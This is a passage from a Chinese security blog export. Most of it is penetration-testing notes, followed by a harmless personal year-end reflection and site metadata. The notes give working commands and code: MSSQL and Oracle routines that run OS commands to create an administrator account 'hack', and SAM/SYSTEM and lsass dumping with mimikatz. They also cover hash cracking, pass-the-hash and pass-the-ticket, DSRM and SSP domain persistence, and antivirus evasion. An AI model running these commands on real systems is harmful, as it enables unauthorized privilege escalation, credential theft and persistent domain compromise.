sgent服务（必须前提），输入文本代码，使回显成一个txt文件查看执行结果。 123456789101112USE msdbEXEC sp_add_job @job_name = &#x27;GetSystemOnSQL&#x27;,@enabled = 1,@description = &#x27;This will give a low privileged user access to xp_cmdshell&#x27;,@delete_level = 1EXEC sp_add_jobstep @job_name = &#x27;GetSystemOnSQL&#x27;,@step_name = &#x27;Exec my sql&#x27;,@subsystem = &#x27;TSQL&#x27;,@command = &#x27;exec master..xp_execresultset N&#x27;&#x27;select &#x27;&#x27;&#x27;&#x27;exec master..xp_cmdshell &quot;net user hack hack /add&gt; c:\\inetpub\\wwwroot\\results.txt&quot;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;,N&#x27;&#x27;Master&#x27;&#x27;&#x27; EXEC sp_add_jobserver @job_name = &#x27;GetSystemOnSQL&#x27;,@server_name = &#x27;NSF-BCF0F41&#x27; EXEC sp_start_job @job_name = &#x27;GetSystemOnSQL&#x27; Oracle 查看配置文件 连接数据库，查看DBA权限select * from session_roles 通过文件代码创建java包，并且创建函数，进一步调用函数执行命令 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556create or replace and compilejava source named &quot;Util&quot;asimport java.io.;import java.lang.;public class Util extends Object&#123;public static int RunThis(String args)&#123;Runtime rt = Runtime.getRuntime();int rc = -1;try&#123;Process p = rt.exec(args);int bufSize = 4096;BufferedInputStream bis =new BufferedInputStream(p.getInputStream(), bufSize);int len;byte buffer[] = new byte[bufSize];// Echo back what the program spit outwhile ((len = bis.read(buffer, 0, bufSize)) != -1)System.out.write(buffer, 0, len);rc = p.waitFor();&#125;catch (Exception e)&#123;e.printStackTrace();rc = -1;&#125;finally&#123;return rc;&#125;&#125;&#125;/create or replacefunction RUN_CMD(p_cmd in varchar2) return numberaslanguage javaname &#x27;Util.RunThis(java.lang.String) return integer&#x27;;/create or replace procedure RC(p_cmd in varchar2)asx number;beginx := run_cmd(p_cmd);end;/variable x number;set serveroutput onexec dbms_java.set_output(100000);grant javasyspriv to CMS/exec :x:= RUN_CMD(&#x27;net user hack hacker /add&#x27;);exec :x:= RUN_CMD(&#x27;net localgroup administrators hack /add&#x27;); #客户端软件提权默认安装一些软件时，会给予最高权限，寻找这些软件文件夹。通过工具生成伪造的插件，重命名以替换原存在的插件。放入目录，等待程序重启即可添加账户。 Linux：对于Linux操作系统，一般都是靠低版本的内核寻找exp进行提权，对于一些高版本的系统基本无解。因此，Linux系统较为安全。 #内核溢出12uname -a//查看内核版本 查找exp 0x04 横向渗透4.1获取散列值#通过SAM和System文件抓取密码导出SAM和System文件： 12reg save hklm\\sam sam.hivereg save hklm\\system system.hive 读取SAM和System文件获取NTLM Hash： 使用mimikatz 使用Cain ….. #使用mimikatz读取除了上面读取SAM文件，还可以离线读取lsass.dmp文件： &#x2F;&#x2F;使用procdump导出lsass.dmp文件 1procdump.exe -accepteula -ma lsass.exe lsass.dmp &#x2F;&#x2F;读取lsass.dmp文件的密码散列值sekurlsa::minidump lsass.DMP 1sekurlsa::logonPasswords full 注意：在目标机器使用mimikatz时，要考虑免杀。 #使用Hashcat获取1hashcat -a 0 -m xx &lt;hashfile&gt;&lt;zidian1&gt;&lt;zidian2&gt; -a 0:以字典模式破解 -m xx:指定内的散列值类型 :将多个散列值存入文本，等待破解 ：指定字典文件 4.2Windows远程连接#IPC1net use \\\\192.168.100.190\\ipc$ &#x27;Aa123456@&#x27; /user:administrator 开启了139、445端口 管理员开启了默认共享 4.3哈希传递#使用NTLM Hash在目标机器中，以管理员权限运行mimikatz。 #使用AES-256密钥（AES-128）使用AES密钥对远程主机进行哈希传递的前提是在本地安装kb2871997。 4.4票据传递#使用mimikatz进行票据传递&#x2F;&#x2F;导出内存中的票据 1mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::tickets /export&quot; &#x2F;&#x2F;清除内存中票据 1mimikatz # kerberos::parge &#x2F;&#x2F;将高权限票据文件注入内存 1mimikatz &quot;kerberos::ptt &quot;c:\\ticket\\[0;4f7cf]-2-0-60a00000-administrator@krbtgt-PENTEST.COM.kirbi&quot; #使用kekeo进行票据传递kekeo需要使用域名、用户名、NTLM Hash三者配合生成票据，再将票据导入，从而直接连接远程计算机。 0x05 权限维持#DSRM域后门DSRM的用途是：允许管理员在域环境中出现故障或崩溃时还原、修复、重建活动目录数据库，使域环境的运行恢复正常。 1234NTDSUTIL:打开ntdsutilset dsrm password:设置dsrm的密码reset password on server null:在当前域控制器上恢复dsrm密码&lt;password&gt;:修改后的密码 windows server2008（且安装了kb961320）： 123NTDSUTIL:打开ntdsutilSET DSRM PASSWORD:设置dsrm密码SYNC FROM DOMAIN ACCOUNT domainusername:使dsrm的密码和指定域用户的密码同步 注意：如果域控制器的系统版本为windows server 2003，则不能使用该方法进行持久化操作。 #SSP维持域控权限SSP是一个dll文件，主要用来实现windows操作系统的身份认证功能。 使用mimikatz将伪造的ssp注入内存（重启会失效） 123privilege::debugmisc::memssp//密码存储在日志文件C:\\\\windows\\system32\\mimilsa.log 将mimikatz中的mimilib.dll放到系统的C:\\Windows\\System32\\目录下，并将mimilib.dll添加到注册表中。","categories":[{"name":"笔记","slug":"笔记","permalink":"https://j47erry.github.io/categories/%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"内网","slug":"内网","permalink":"https://j47erry.github.io/tags/%E5%86%85%E7%BD%91/"},{"name":"笔记","slug":"笔记","permalink":"https://j47erry.github.io/tags/%E7%AC%94%E8%AE%B0/"}],"author":"J47erry"},{"title":"#致敬我这混沌的2021","slug":"致敬我这混沌的2021","date":"2021-12-30T22:38:00.000Z","updated":"2022-12-31T13:40:17.877Z","comments":true,"path":"2021/12/31/致敬我这混沌的2021/","link":"","permalink":"https://j47erry.github.io/2021/12/31/%E8%87%B4%E6%95%AC%E6%88%91%E8%BF%99%E6%B7%B7%E6%B2%8C%E7%9A%842021/","excerpt":"","text":"致敬我这混沌的2021尽管在我看来我的2021好像与前十几年并没有什么不同，终归都是浑浑噩噩，混混沌沌，但临近年末，看着大佬们的年度总结，感慨万千，思来想去总归是该写点文字来纪念2021的。 对标or@nge神的年度总结，本人在技术，学习以及其他方面好像没有特别能够拿出来详细总结说说。因此，这段文字只是用来记录这个时刻这个阶段的思想态度吧，希望走了一段时间后，能有参照物看看自己的思想变化。 0x00 伊始2021好像是以我转专业到计算机学院开始的。对于非得转专业的缘由，我好像已经记不太清，或许是原专业的枯燥乏味，或许是计算机是风口专业，更或许是我真正所热爱的专业，但不管是何原因，我都是抱着对计算机极大的兴趣来到这里。尽管纵观这一年，好像也没有取得比较令人骄傲的成绩，但比起在原专业的整年摆烂，之后的自学看视频也好，熬夜敲代码也罢，这些都让我找到了阶段性的且积极向上的奋斗力量。因此用一个词概括2021的伊始，或是 踌躇满志 吧。 0x01 低迷也许有学校的原因，也许也是学院的问题，身边的女孩子好像对于专业的态度不是特别认真。对于我这种又懒又缺乏自制力的家伙，缺少学习氛围，对我算的上是致命性的伤害。很快，属于大学的第二学期就那么过去了。匆匆忙忙的期末着实让摸鱼的我有些手忙脚乱，不过还算是勉强过关吧。即使在这个时刻，我也是对于自己的侥幸过关而感到幸运。真正让我认清现实的是，同班同学的综测智育成绩于我高出一大截，其他学校的其他专业的朋友刊登的大大小小的文章以及or@ange神的一纸offer。原来，在我还在为自己的小聪明沾沾自喜的时候，同龄人已经走了这么远了。于是，我急于改变，急于进步，甚至急于出成绩。于是，我想效仿那位出文章的朋友，能够能有导师带带做项目。于是，这样想就这样做了，我在那位朋友的鼓舞下找了祁老师。于是，有了祁老师和我的谈话，以及躺在U盘的一系列资料。但我对算法或是前端的vue框架好像无甚兴趣，便慢慢的荒废了下去。因此，我又陷入了渴望进步又无方向的矛盾之中。 0x02 改变年末，机缘巧合下与or@nge神闲聊上了两句。他向我打开了新世界的大门–安全。不得不说，在此之前，我虽接触了解过开发，前端，软工亦或是软测方向，但对于安全我着实是一筹莫展。不过，我现在才知道安全算是属于信安的一种，与平时的计科有点区别。在or@nge的推荐下，了解了安全的大致学习范围，惊喜地发现这其实是我以前所倾向于的行业。说干就干，视频开始囤开始学。不过，对于我一样刚刚接触这个东西的纯纯小白来说，刚开始地自学犹如狗咬刺猬一样，无从下口。因为种种的原因，我痴迷于橙神的光环。这便造成了我在自学的过程中急于求成。很正常的是，我并不是天赋异禀，也没有橙神那么肝的魄力。意料之中的，我又开始了低迷时期。尽管现在的我可能还是在泥潭里挣扎，但还是很感谢橙神。我愿之将其称为男神的原因，不仅仅是因为他做到的一些成就，更因为他有时候一两句的指导，可能在他看来没什么，但对于那段时间低迷的我算的上是拨开尘雾的光亮了。于是，在2021年的尾巴，我做出了抉择，也摆正了心态。专注自己才是，脚踏实地才是。毕竟平凡的小孩也可以做五彩斑斓的梦，不是嘛？ 年度总结大约就是这样了，最开始下笔的时候，我没想到会有这上千字。在我觉得平淡无味的2021年，其实我好像也有一定的改变和收获。我接受志向满怀的自己，也不否认持续低迷的自己，但更期待做一个热血笨蛋的自己。真切地希望2022年我能够在各个方面热血，学习也好，人际也要是。很合适宜的是，现在耳机里刚好放着《不服》hhh，“我曾经退缩我懦弱我真的幼稚，但我还有路要走” 仅用以上1400个字致敬我这混沌的2021年。 永远热血赴山海","categories":[{"name":"总结","slug":"总结","permalink":"https://j47erry.github.io/categories/%E6%80%BB%E7%BB%93/"}],"tags":[{"name":"年度总结","slug":"年度总结","permalink":"https://j47erry.github.io/tags/%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/"}],"author":"J47erry"}],"categories":[{"name":"总结","slug":"总结","permalink":"https://j47erry.github.io/categories/%E6%80%BB%E7%BB%93/"},{"name":"笔记","slug":"笔记","permalink":"https://j47erry.github.io/categories/%E7%AC%94%E8%AE%B0/"},{"name":"面经","slug":"面经","permalink":"https://j47erry.github.io/categories/%E9%9D%A2%E7%BB%8F/"}],"tags":[{"name":"年度总结","slug":"年度总结","permalink":"https://j47erry.github.io/tags/%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/"},{"name":"提权","slug":"提权","permalink":"https://j47erry.github.io/tags/%E6%8F%90%E6%9D%83/"},{"name":"免杀","slug":"免杀","permalink":"https://j47erry.github.io/tags/%E5%85%8D%E6%9D%80/"},{"name":"内网","slug":"内网","permalink":"https://j47erry.github.io/tags/%E5%86%85%E7%BD%91/"},{"name":"WP","slug":"WP","permalink":"https://j47erry.github.io/tags/WP/"},{"name":"面试","slug":"面试","permalink":"https://j47erry.github.io/tags/%E9%9D%A2%E8%AF%95/"},{"name":"笔记","slug":"笔记","permalink":"https://j47erry.github.io/tags/%E7%AC%94%E8%AE%B0/"}]}